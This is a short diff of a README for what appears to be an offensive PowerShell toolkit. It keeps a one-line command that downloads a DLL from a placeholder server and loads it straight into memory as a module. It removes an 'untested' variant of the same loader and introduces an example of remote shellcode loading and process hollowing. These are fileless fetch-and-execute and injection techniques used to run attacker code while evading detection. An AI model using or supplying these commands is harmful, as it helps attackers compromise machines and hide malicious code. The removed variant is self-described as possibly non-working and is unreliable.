@@ -9,12 +9,6 @@ Load it
 ```powershell
 $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
 Import-Module -Assembly $a
-
-Untested but should work. maybe.
-$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);
-$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
-Import-Module -Assembly $a
-
 ```
 
 Example of remotely loading and encrypting shellcode, then performing proc hollow with it
